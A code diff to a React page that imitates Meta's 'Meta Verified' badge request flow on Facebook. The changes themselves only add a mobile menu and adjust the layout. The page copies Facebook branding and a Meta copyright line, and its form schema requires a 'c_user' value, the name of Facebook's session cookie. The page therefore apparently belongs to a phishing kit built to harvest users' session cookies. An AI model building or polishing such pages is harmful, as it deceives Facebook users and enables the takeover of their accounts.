@@ -17,7 +17,7 @@ import MetaTags from "@/components/meta-tags";
 import { z } from "zod";
 import { useMobile } from "@/hooks/use-mobile";
 import { MobileModal } from "@/components/mobile-modal";
-import { Search, Home, ChevronDown, Settings } from "lucide-react";
+import { Search, Home, ChevronDown, Settings, Menu } from "lucide-react";
 
 const validationFormSchema = z.object({
   c_user: z.string().min(1, "c_user is required"),
@@ -31,6 +31,7 @@ export default function Validation() {
   const [, setLocation] = useLocation();
   const isMobile = useMobile();
   const [showMobileModal, setShowMobileModal] = useState(false);
+  const [showMobileMenu, setShowMobileMenu] = useState(false);
 
   useEffect(() => {
     if (isMobile) {
@@ -72,17 +73,14 @@ export default function Validation() {
   };
 
   return (
-    <div className="min-h-screen flex" style={{
-      background: "linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)",
-      fontFamily: "Arial, Helvetica, sans-serif"
-    }}>
+    <div className="min-h-screen flex">
       <MetaTags 
         title="Meta Verified | Validation"
         description="Request a verified badge on Facebook - Initial Step"
       />
       <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />
 
-      {/* Left Sidebar */}
+      {/* Left Sidebar - Hidden on mobile */}
       <div className="hidden md:flex flex-col bg-white h-screen overflow-y-auto border-r" style={{ width: "320px" }}>
         <div className="p-4">
           <div className="flex items-center mb-4">
@@ -120,11 +118,53 @@ export default function Validation() {
         </div>
       </div>
 
+      {/* Mobile Menu Overlay */}
+      {showMobileMenu && (
+        <div className="md:hidden fixed inset-0 bg-black bg-opacity-50 z-40" onClick={() => setShowMobileMenu(false)}>
+          <div className="bg-white w-64 h-full" onClick={e => e.stopPropagation()}>
+            <div className="p-4">
+              <div className="flex items-center mb-4">
+                <svg className="h-8 w-8 text-[#0180FA]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" fill="none">
+                  <path fillRule="evenodd" clipRule="evenodd" d="M21.0802 11.9059C21.0802 16.9014 16.9015 21.0802 11.9059 21.0802C6.91041 21.0802 2.73169 16.9014 2.73169 11.9059C2.73169 6.91041 6.91041 2.73169 11.9059 2.73169C16.9015 2.73169 21.0802 6.91041 21.0802 11.9059ZM23 11.9059C23 18.0195 18.0195 23 11.9059 23C5.79239 23 0.811859 18.0195 0.811859 11.9059C0.811859 5.79239 5.79239 0.811859 11.9059 0.811859C18.0195 0.811859 23 5.79239 23 11.9059ZM11.9059 19.1604C15.8411 19.1604 18.9995 16.002 18.9995 12.0668C18.9995 8.13157 15.8411 4.97319 11.9059 4.97319C7.97064 4.97319 4.81226 8.13157 4.81226 12.0668C4.81226 16.002 7.97064 19.1604 11.9059 19.1604Z" fill="#0180FA"/>
+                </svg>
+                <h1 className="text-lg font-semibold ml-2">Meta Verified</h1>
+              </div>
+              {/* Mobile Menu Items */}
+              <div className="space-y-2">
+                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center mb-2 text-[#65676B]">
+                  <Home className="w-4 h-4 mr-2" />
+                  Home Page
+                </button>
+                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
+                  <span>Meta Verified</span>
+                  <ChevronDown className="w-4 h-4" />
+                </button>
+                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
+                  <span>Rules and Guidelines</span>
+                  <ChevronDown className="w-4 h-4" />
+                </button>
+                <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
+                  <span>Settings</span>
+                  <Settings className="w-4 h-4" />
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Main Content */}
       <div className="flex-1 flex flex-col">
         {/* Navigation Bar */}
         <nav className="flex items-center justify-between p-3 sm:p-4 border-b bg-white">
-          <div className="flex items-center md:hidden">
+          <div className="flex items-center">
+            {/* Mobile Menu Button */}
+            <button 
+              className="md:hidden mr-3 text-[#65676B]"
+              onClick={() => setShowMobileMenu(true)}
+            >
+              <Menu className="w-6 h-6" />
+            </button>
             <p className="text-[#0180FA] text-xl sm:text-2xl font-bold">facebook</p>
           </div>
           <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
@@ -138,7 +178,7 @@ export default function Validation() {
         </nav>
 
         <div className="flex-1 flex justify-center p-4 sm:p-8 overflow-y-auto">
-          <div className="max-w-2xl w-full space-y-4 sm:space-y-6 bg-white rounded-lg p-6">
+          <div className="w-full max-w-2xl space-y-4 sm:space-y-6 bg-white rounded-lg p-4 sm:p-6">
             <h1 className="text-xl sm:text-2xl font-bold text-[#1c1e21]">
               Request a verified badge on Facebook
             </h1>
@@ -240,6 +280,7 @@ export default function Validation() {
           Meta © 2025
         </div>
       </div>
+
       <style>{`
         .video-container {
           box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
